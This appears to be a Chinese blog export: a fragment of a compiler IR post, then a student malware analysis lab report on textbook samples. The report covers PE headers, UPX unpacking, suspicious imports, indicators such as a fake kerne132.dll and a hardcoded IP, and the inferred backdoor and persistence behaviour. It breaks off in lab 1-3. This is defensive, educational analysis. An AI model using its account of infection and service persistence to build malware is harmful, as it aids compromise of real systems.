<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240910005409787.png" alt="image-20240910005409787"></p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240910005354879.png" alt="image-20240910005354879"></p>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240910005204216.png" alt="image-20240910005204216"></p>
<h2 id="1-形式"><a href="#1-形式" class="headerlink" title="1.形式"></a>1.形式</h2><blockquote>
<p>需要知道程序是如何翻译为ir的，但是了解过程之前，需要知道何为ir</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909215944239.png" alt="image-20240909215944239"></p>
<h2 id="1-1三地址码"><a href="#1-1三地址码" class="headerlink" title="1.1三地址码"></a>1.1三地址码</h2><blockquote>
<p>静态单赋值</p>
</blockquote>
<h3 id="1-1-1简单形式（仅顺序且最多调用函数）"><a href="#1-1-1简单形式（仅顺序且最多调用函数）" class="headerlink" title="1.1.1简单形式（仅顺序且最多调用函数）"></a>1.1.1简单形式（仅顺序且最多调用函数）</h3><p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909220515875.png" alt="image-20240909220515875"></p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909220157173.png" alt="image-20240909220157173"></p>
<blockquote>
<p>含义</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909220438564.png" alt="image-20240909220438564"></p>
<h3 id="1-1-2-进一步形式"><a href="#1-1-2-进一步形式" class="headerlink" title="1.1.2 进一步形式"></a>1.1.2 进一步形式</h3><blockquote>
<p>函数中有分支（为了研究函数中的基本块）</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909221937335.png" alt="image-20240909221937335"></p>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909222753665.png" alt="image-20240909222753665"></p>
<blockquote>
<p>优化之后</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909224626604.png" alt="image-20240909224626604"></p>
<blockquote>
<p>何为基本块：</p>
<p>只能在入口跳入，或在出口跳出，边用来描述基本块之间的跳转。</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909222324799.png" alt="image-20240909222324799"></p>
<blockquote>
<p>重要指令phi</p>
</blockquote>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909225136105.png" alt="image-20240909225136105"></p>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240909225212230.png" alt="image-20240909225212230"></p>
<h3 id="1-1-2-加上循环"><a href="#1-1-2-加上循环" class="headerlink" title="1.1.2 加上循环"></a>1.1.2 加上循环</h3><p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240910003633534.png" alt="image-20240910003633534"></p>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240910004211809.png" alt="image-20240910004211809"></p>
<p><img src="/img/mypic/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/image-20240910004927981.png" alt="image-20240910004927981"></p>
<h2 id="2-实现"><a href="#2-实现" class="headerlink" title="2.实现"></a>2.实现</h2><blockquote>
<p>可调用llvm提供的构建指令的api</p>
</blockquote>
]]></content>
      <categories>
        <category>compiler</category>
      </categories>
      <tags>
        <tag>compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意代码分析实验</title>
    <url>/2024/09/15/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/lab1/</url>
    <content><![CDATA[<p>课后作业没有什么阅读价值</p>
<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a><strong>一、实验目的</strong></h2><p>（1）完成教材上lab1-01至Lab1-04的题目；</p>
<p>（2）根据理论课要求提交所有样本在VIrusTotal和MicroSoft Defender AntiVirus上的的分析结果</p>
<p>（3）编写yara规则对样本进行检测</p>
<h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a><strong>二、实验原理</strong></h2><h3 id="1-PE文件结构"><a href="#1-PE文件结构" class="headerlink" title="1.PE文件结构"></a>1.PE文件结构</h3><p>PE（Portable Executable）文件是Windows操作系统下可执行文件、DLL、驱动程序等文件的通用格式。PE文件包括多个部分，其中最关键的部分包括：</p>
<ul>
<li><strong>DOS Header</strong>: PE文件最开始的一部分，包含DOS可执行程序的头部，主要用于兼容老旧的DOS系统。</li>
<li><strong>PE Header</strong>: 包含文件的元数据信息，包括机器类型、时间戳、入口点等。</li>
<li><strong>Section Table</strong>: 列出了PE文件的各个部分，包括代码段（.text）、数据段（.data）、资源段（.rsrc）等，每个段都有相应的权限和属性。</li>
<li><strong>Import Table（导入表）</strong>: 列出了该文件运行时依赖的外部库和函数，如kernel32.dll中的CreateFileA函数。</li>
<li><strong>Export Table（导出表）</strong>: 若该PE文件是DLL文件，该表记录了其对外导出的函数。</li>
<li><strong>Relocation Table</strong>: 用于在内存地址重定位时调整代码中的地址。</li>
</ul>
<h3 id="2-加壳脱壳"><a href="#2-加壳脱壳" class="headerlink" title="2.加壳脱壳"></a>2.加壳脱壳</h3><p>加壳是一种常见的对可执行文件进行压缩和加密的技术，通常用于减少文件大小或增加文件的保护性，防止反向工程。常见的加壳工具包括UPX、Themida等。</p>
<ul>
<li><strong>加壳原理</strong>：加壳工具会对PE文件的代码段和数据段进行压缩或加密，并在文件头部插入解压或解密代码，以在文件运行时恢复原始代码。加壳后的文件结构通常会丢失原始的段结构，呈现出较高的信息熵值。</li>
<li><strong>脱壳原理</strong>：脱壳是逆向分析中常用的技术，目的是通过静态或动态手段恢复加壳前的文件。动态脱壳通常通过调试器在程序运行时的OEP（Original Entry Point，原始入口点）处下断点，程序解密并恢复代码后手动导出PE文件。<ul>
<li><strong>判断文件是否加壳</strong>：通常可以通过分析PE文件的Section表，查看段的数量、大小以及熵值（entropy）。加壳文件通常段数较少，且熵值接近7-8，表明内容被压缩或加密。</li>
<li><strong>脱壳流程</strong>：<ol>
<li>通过调试器（如OllyDbg）或自动化脱壳工具（如UPX脱壳工具）对目标程序进行动态调试，定位到OEP。</li>
<li>导出内存中的PE结构，保存为未加壳的文件。</li>
<li>重新调整导入表等内容，确保程序在不加壳的情况下正常运行。</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="3-yara规则制定"><a href="#3-yara规则制定" class="headerlink" title="3.yara规则制定"></a>3.yara规则制定</h3><p>Yara是一种基于规则的恶意软件检测工具，通过编写规则来匹配文件中的特定模式，从而识别恶意文件或特定的文件特征。Yara规则通常用于恶意软件分析中批量检测具有相同特征的文件。</p>
<ul>
<li><strong>Yara规则结构</strong>：<ul>
<li><strong>规则头部</strong>：包括规则的名称、作者、描述等元数据。</li>
<li><strong>字符串部分</strong>：列出要匹配的字符串模式，支持文本、字节、正则表达式等多种形式。</li>
<li><strong>条件部分</strong>：设定匹配的条件，可以是字符串是否存在、某些数值范围等复杂的逻辑。</li>
</ul>
</li>
</ul>
<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a><strong>三、实验过程</strong></h2><h3 id="lab-1-1"><a href="#lab-1-1" class="headerlink" title="lab 1-1"></a><strong>lab 1-1</strong></h3><blockquote>
<p>这个实验使用Lab01-01.exe和Lab01-01.dll文件,的信息。</p>
</blockquote>
<ul>
<li><h4 id="Q1-将文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗"><a href="#Q1-将文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗" class="headerlink" title="Q1.将文件上传至http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗?"></a>Q1.将文件上传至<a href="http://www.virustotal.com/%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%8A%A5%E5%91%8A%E3%80%82%E6%96%87%E4%BB%B6%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86%E5%B7%B2%E6%9C%89%E7%9A%84%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%89%B9%E5%BE%81%E5%90%97">http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗</a>?</h4><blockquote>
<p>成功识别出恶意文件，exe和dll最初识别结果如下：</p>
</blockquote>
<p><strong>exe</strong></p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909111144275.png" alt="image-20240909111144275"></p>
<p><strong>dll</strong></p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909111208469.png"></p>
<p>结果显示超过半数的安全供应商将其识别成恶意软件，基本已经可以判断其为恶意软件了。</p>
<blockquote>
<p>VT也识别出了其hash值，string等相关特征，exe和dll分别的结果如下：</p>
</blockquote>
<p><strong>exe</strong>：</p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909111624955.png" alt="image-20240909111624955"></p>
<p><strong>dll</strong>：</p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909111533846.png" alt="image-20240909111533846"></p>
<blockquote>
<p>VT也识别出了其pe文件的相关特征，exe和dll分别的结果如下：</p>
</blockquote>
<p><strong>exe</strong>：</p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909111703399.png" alt="image-20240909111703399"></p>
<p><strong>dll</strong>：</p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909111720986.png" alt="image-20240909111720986"></p>
<p>以上信息均可对其做出是否为恶意文件的初步判断。</p>
</li>
<li><h4 id="Q2-这些文件是什么时候编译的"><a href="#Q2-这些文件是什么时候编译的" class="headerlink" title="Q2.这些文件是什么时候编译的?"></a>Q2.这些文件是什么时候编译的?</h4><blockquote>
<p>可通过查看<code>pe</code>文件中的<code>struct IMAGE_NT_HEADERS NtHeader</code> 中的<code>IMAGE_FILE_HEADER FileHeader</code>得到答案。exe和dll分别如下图所示（010editor）：</p>
</blockquote>
<p><strong>exe</strong>：时间戳值为：0x4d0e2fd3（小端法）</p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909112450130.png" alt="image-20240909112450130"></p>
<p>网上在线工具转换：可以看出和010相差8h，010转换的是UTC时间，因此010加上8h则可以得到东八区时间（北京时间）。</p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909122038455.png" alt="image-20240909122038455"></p>
<p><strong>dll</strong>：时间戳值为：0x4d0e2fe6（小端法）</p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909112354943.png" alt="image-20240909112354943"></p>
<p>转换规则同上。</p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909122251259.png" alt="image-20240909122251259"></p>
</li>
<li><h4 id="Q3-这两个文件中是否存在迹象说明它们是否被加壳或混淆了-如果是-这些迹象在哪里"><a href="#Q3-这两个文件中是否存在迹象说明它们是否被加壳或混淆了-如果是-这些迹象在哪里" class="headerlink" title="Q3.这两个文件中是否存在迹象说明它们是否被加壳或混淆了?如果是,这些迹象在哪里?"></a>Q3.这两个文件中是否存在迹象说明它们是否被加壳或混淆了?如果是,这些迹象在哪里?</h4><blockquote>
<p>没有被加壳，两个文件的pe中都能正确显示section信息，若被加壳的话section是不会被正确现实的，需要通过解码程序来找到<code>OEP</code>。</p>
</blockquote>
<p><strong>exe</strong></p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909112658199.png" alt="image-20240909112658199"></p>
<p><strong>dll</strong></p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909112633934.png" alt="image-20240909112633934"></p>
<blockquote>
<p>文件也没有被混淆，可以通过die查看文件的信息熵，可以观察到都是比较低的，如果文件经过加密、压缩或混淆，其熵值会接近 7 或 8，而该文件的各节熵值大致在 4 到 4.5 之间，dll则更低了。</p>
</blockquote>
<p><strong>exe</strong></p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909123305249.png" alt="image-20240909123305249"></p>
<p><strong>dll</strong></p>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909123423745.png" alt="image-20240909123423745"></p>
</li>
<li><h4 id="Q4-是否有导入函数显示出了这个恶意代码是做什么的-如果是-是哪些导入函数"><a href="#Q4-是否有导入函数显示出了这个恶意代码是做什么的-如果是-是哪些导入函数" class="headerlink" title="Q4.是否有导入函数显示出了这个恶意代码是做什么的?如果是,是哪些导入函数?"></a>Q4.是否有导入函数显示出了这个恶意代码是做什么的?如果是,是哪些导入函数?</h4><blockquote>
<p>两个程序导入函数都有正确的符号，符号没有被strip，因此可以通过导入函数来初步判断程序功能，具体的查看方式可以通过010editor查看可执行文件的导入名称表（INT）</p>
</blockquote>
<p><strong>exe</strong></p>
<blockquote>
<p>只导入了两个库。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909131336965.png" alt="image-20240909131336965"></p>
<blockquote>
<p>kernel32.dll导入描述目录以及导入表中的导入名称表项如下：这些函数与进程控制、线程同步和资源管理密切相关。通常用于创建进程、管理互斥锁、同步线程，以及控制程序执行时间。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909131423082.png" alt="image-20240909131423082"></p>
<blockquote>
<p>这个是msvc的运行时库，也就是编程开发人员常用库，提供一些最基本的函数调用接口，如内存动态分配，字符串操作等等。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909131526983.png" alt="image-20240909131526983"></p>
<p><strong>dll</strong></p>
<blockquote>
<p>可以观察到其导入了三个库，接下来可以分别查看三个库的导入信息表。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909123834236.png" alt="image-20240909123834236"></p>
<blockquote>
<p>同exe文件分析。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909124124143.png" alt="image-20240909124124143"></p>
<blockquote>
<p>ws2_32.dll如下：其中有个值得注意的事情，那就是其导入名称表是空的，OriginalFirstThunk原来指向导入名称表，但是现在指向的是ordinal，可以用die查看比较直观，ws2_32.dll的导出描述符有相应的索引，因此这样可以加速文件查找，否则就需要拿字符串对比。此库中的功能和网络通信相关。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909130822720.png" alt="image-20240909130822720"></p>
<p><img src="/../../../themes/diaspora/source/img/mypic/com/image-20240909130853687.png" alt="image-20240909130853687"></p>
<blockquote>
<p>同exe文件分析</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240909124229386.png" alt="image-20240909124229386"></p>
</li>
<li><h4 id="Q5-是否有任何其他文件或基于主机的迹象-让你可以在受感染系统上查找"><a href="#Q5-是否有任何其他文件或基于主机的迹象-让你可以在受感染系统上查找" class="headerlink" title="Q5.是否有任何其他文件或基于主机的迹象,让你可以在受感染系统上查找?"></a>Q5.是否有任何其他文件或基于主机的迹象,让你可以在受感染系统上查找?</h4><blockquote>
<p>可观察到.exe文件在程序开始做了如下操作：</p>
<p>文件 (磁盘)<br>   |<br>   v<br>CreateFileMappingA –&gt; 创建文件映射对象（虚拟地址空间准备）<br>   |<br>   v<br>MapViewOfFile –&gt; 将文件的一部分或全部映射到进程的虚拟内存空间<br>   |<br>   v<br>访问映射的内存区域 (通过指针操作内存) –&gt; 按需加载文件内容到内存，或者将修改同步回文件。</p>
<p>分别打开kernel.dll和Lab01-01.dll，故猜测此程序会对kernel.dll做一些替换更改操作，使其感染Lab01-01.dll。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/exedy.png" alt="image-20240917115247791"></p>
<blockquote>
<p>在中间经过一系列的变换过程，已经对kernel.dll做了一些列操作之后，会执行：<code>CopyFileA(ExistingFileName, NewFileName, 0)</code>将字符串改变<code>.data:0040307C ExistingFileName db &#39;Lab01-01.dll&#39;,0 </code>,<code>NewFileName     db &#39;C:\windows\system32\kerne132.dll&#39;,0</code>仅仅是单纯的字符串copy操作，没有实际意义，反倒提醒了感染者kernel.dll已经被替换为了kerne132.dll。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/str.png" alt="image-20240917120845256"></p>
<blockquote>
<p>最后会执行<code>sub_4011E0(aC, 0)</code>函数，<code>aC              db &#39;C:\*&#39;,0</code>ac是c目录，追进去分析一下。可以观察到其正在遍历目录下的文件，并做了一些列的复杂操作。第一个分支是对非目录进行操作，第二个分支则是对目录进行递归调用操作。其通过<code>FindFirstFileA</code>和<code>FindNextFileA</code>实现了所有文件的遍历。</p>
<p>对文件进行操作，会定位文件的扩展名，进行和.exe比较，来判断是否为可执行文件，若是，则会进一步操作。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/find.png" alt="image-20240917121644938"></p>
<blockquote>
<p>综上所述可以发现很多文件的感染迹象，主要是动态链接库<code>kernel.dll</code>和c目录下的<code>exe</code>文件,但是感染的逻辑需要进一步分析。</p>
</blockquote>
</li>
<li><h4 id="Q6-是否有基于网络的迹象-可以用来发现受感染机器上的这个恶意代码"><a href="#Q6-是否有基于网络的迹象-可以用来发现受感染机器上的这个恶意代码" class="headerlink" title="Q6.是否有基于网络的迹象,可以用来发现受感染机器上的这个恶意代码?"></a>Q6.是否有基于网络的迹象,可以用来发现受感染机器上的这个恶意代码?</h4><blockquote>
<p>在分析exe文件时并没有找到和网络库相关的导入函数的操作，因此猜测替换的dll中会存在和网络相关的操作。在上面Q4的分析中，在dll中找到了ws2_32.dll导入库，此库函数则是和网路通信相关，因此其可以作为基于网络的迹象的追寻的入口点。但是这些导入函数是按照序号进行导入的,无法知道导入的到底是哪些函数。（应该可以通过查找ws2_32.dll导出表的ordinal表项来得到导入的是什么函数），其在C:\Windows\System32目录下可以找到。通过如下工具可以快速找到ordinal对应的function。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/ord.png" alt="image-20240917132248816"></p>
<p>结合Q4中的ordinal值，可以得到如下几个导出函数：都可用来研究程序的行为。ida也可以查看导入了那个函数，会更加方便，和下述分析相一致。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ordinal hint RVA      name</span><br><span class="line"><span class="number">23</span>      C3 <span class="number">0000</span>A060 socket</span><br><span class="line"><span class="number">115</span>     <span class="number">59</span> <span class="number">0000</span>EE40 WSAStartup</span><br><span class="line"><span class="number">4</span>       A4 <span class="number">00013330</span> connect</span><br><span class="line"><span class="number">11</span>      B4 <span class="number">00014110</span> inet_addr</span><br><span class="line"><span class="number">19</span>      BF <span class="number">000028</span>C0 send</span><br><span class="line"><span class="number">22</span>      C2 <span class="number">00012F</span>20 shutdown</span><br><span class="line"><span class="number">16</span>      BC <span class="number">00012280</span> recv</span><br><span class="line"><span class="number">3</span>       A3 <span class="number">0000B</span>740 closesocket</span><br><span class="line"><span class="number">9</span>       B3 <span class="number">00013</span>AA0 htons</span><br><span class="line"><span class="number">116</span>     <span class="number">1F</span> <span class="number">00011390</span> WSACleanup</span><br></pre></td></tr></table></figure>

<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/ida.png" alt="image-20240917133450465"></p>
<blockquote>
<p>接着查找字符串表，很容易找到ip：<code>.data:10026028 cp              db &#39;127.26.152.13&#39;,0    ; DATA XREF: DllMain(x,x,x)+93↑o</code>,亦可以作为分析的入口点。</p>
</blockquote>
<blockquote>
<p>最后书上还有一个额外迹象（没有想到，主要是不了解msvc）：我们也看到了从kernel32.dll导入了两个有趣的函数:CreateProcess和Sleep。这两个函数普遍在后门程序中使用。这些函数在与exec与sleep字符串结合使用时,需要特别的关注。exec字符串可能是通过网络来给后门程序传送命令,让它通过CreateProcess函数运行一个程序的。</p>
</blockquote>
</li>
<li><h4 id="Q7-你猜这些文件的目的是什么"><a href="#Q7-你猜这些文件的目的是什么" class="headerlink" title="Q7.你猜这些文件的目的是什么?"></a>Q7.你猜这些文件的目的是什么?</h4><p>dll提供网络通信可以远程操纵主机，而exe用来安装dll，并感染c目录，为dll的运行做充足准备，至于如何感染，需要分析exe的主要逻辑。</p>
</li>
</ul>
<h3 id="lab-1-2"><a href="#lab-1-2" class="headerlink" title="lab 1-2"></a><strong>lab 1-2</strong></h3><blockquote>
<p>分析Lab01-02.exe</p>
</blockquote>
<ul>
<li><h4 id="Q1-将-Lab01-02-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗"><a href="#Q1-将-Lab01-02-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗" class="headerlink" title="Q1.将 Lab01-02.exe 文件上传至http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗?"></a>Q1.将 Lab01-02.exe 文件上传至<a href="http://www.virustotal.com/%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%8A%A5%E5%91%8A%E3%80%82%E6%96%87%E4%BB%B6%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86%E5%B7%B2%E6%9C%89%E7%9A%84%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%89%B9%E5%BE%81%E5%90%97">http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗</a>?</h4><blockquote>
<p>结果显示超过半数的安全供应商将其识别成恶意软件，基本已经可以判断其为恶意软件了。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917140332076.png" alt="image-20240917140332076"></p>
<blockquote>
<p>VT也识别出了其hash值，string等相关特征</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917140439054.png" alt="image-20240917140439054"></p>
<blockquote>
<p>可执行文件特征</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917140601260.png" alt="image-20240917140601260"></p>
<blockquote>
<p>sandbox测试</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917140825866.png" alt="image-20240917140825866"></p>
</li>
<li><h4 id="Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。"><a href="#Q2-是否有这个文件被加壳或混淆的任何迹象-如果是这样-这些迹象是什么-如果该文件被加壳-请进行脱壳-如果可能的话。" class="headerlink" title="Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。"></a>Q2.是否有这个文件被加壳或混淆的任何迹象?如果是这样,这些迹象是什么?如果该文件被加壳,请进行脱壳,如果可能的话。</h4><blockquote>
<p>可以看出被加壳upx壳，放入ida和die或者010都可看出，upx是压缩壳主要用来减少文件体积，不太适合用来文件保护，因此脱壳很容易。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/2upx.png"></p>
<blockquote>
<p>容易脱壳</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917135151256.png" alt="image-20240917135151256"></p>
<blockquote>
<p>信息熵很低，没有混淆。</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20240917135313441.png" alt="image-20240917135313441"></p>
</li>
<li><h4 id="Q3-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么"><a href="#Q3-有没有任何导入函数能够暗示出这个程序的功能-如果是-是哪些导入函数-它们会告诉你什么" class="headerlink" title="Q3.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?"></a>Q3.有没有任何导入函数能够暗示出这个程序的功能?如果是,是哪些导入函数,它们会告诉你什么?</h4><blockquote>
<p>**<code>CreateThread</code>、<code>CreateMutexA</code>、<code>OpenMutexA</code>**：这些函数表明程序使用多线程来执行不同任务，并通过互斥锁进行同步控制。</p>
<p>**<code>CreateServiceA</code>、<code>StartServiceCtrlDispatcherA</code>、<code>OpenSCManagerA</code>**：这些函数显示程序可以创建和控制系统服务，表明它可能通过创建一个服务来确保自己在系统启动时自动运行。这是恶意软件经常使用的持久化技术，能够保证在重启后仍然驻留系统中。</p>
<p>**<code>InternetOpenA</code>、<code>InternetOpenUrlA</code>**：这些函数表明程序可能会通过网络进行远程通信，连接到恶意服务器</p>
<p>**<code>CreateWaitableTimerA</code>、<code>SetWaitableTimer</code>**：这类函数显示程序可能会设置定时任务，进行定期的恶意操作或延迟执行。这可以用于规避检测，或在特定时间激活恶意活动。</p>
<p>**<code>ExitProcess</code>、<code>_exit</code>**：这些函数表明恶意程序可能会在完成任务后自行结束，或者在执行特定恶意操作后强制退出以规避安全监控。</p>
<p>**<code>_XcptFilter</code>、<code>except_handler3</code>**：这些异常处理函数可能用于应对运行时错误，避免程序崩溃。同时，恶意软件也经常通过这些机制来检测调试环境，防止分析人员调试或逆向其代码。</p>
<p>**<code>_getmainargs</code>**：这个函数用于获取命令行参数，意味着这个恶意软件可能支持命令行参数执行不同的任务，允许攻击者在不同场景下传递特定的参数来控制其行为。</p>
</blockquote>
</li>
<li><h4 id="Q4-哪些基于主机或基于网络的迹象可以被用来确定被这个恶意代码所感染的机器"><a href="#Q4-哪些基于主机或基于网络的迹象可以被用来确定被这个恶意代码所感染的机器" class="headerlink" title="Q4.哪些基于主机或基于网络的迹象可以被用来确定被这个恶意代码所感染的机器?"></a>Q4.哪些基于主机或基于网络的迹象可以被用来确定被这个恶意代码所感染的机器?</h4><blockquote>
<p>检查字符啊串表可以发现服务器域名，也许这个服务器是一个恶意服务器，可以检测其网络活动来进一步探究</p>
</blockquote>
<p><img src="/../../../themes/butterfly/source/img/mypic/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/2.png" alt="image-20240917140043982"></p>
</li>
</ul>
<h3 id="lab-1-3"><a href="#lab-1-3" class="headerlink" title="lab 1-3"></a><strong>lab 1-3</strong></h3><blockquote>
<p>分析Lab01-03.exe</p>
</blockquote>
<ul>
<li><h4 id="Q1-将Lab01-03-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗"><a href="#Q1-将Lab01-03-exe-文件上传至http-www-VirusTotal-com-进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗" class="headerlink" title="Q1.将Lab01-03.exe 文件上传至http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗?"></a>Q1.将Lab01-03.exe 文件上传至<a href="http://www.virustotal.com/%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%8A%A5%E5%91%8A%E3%80%82%E6%96%87%E4%BB%B6%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86%E5%B7%B2%E6%9C%89%E7%9A%84%E5%8F%8D%E7%97%85%E6%AF%92%E8%BD%AF%E4%BB%B6%E7%89%B9%E5%BE%81%E5%90%97">http://www.VirusTotal.com/进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗</a>?</h4><blockquote>
<p>90%报告，可以判断为恶意软件</p>
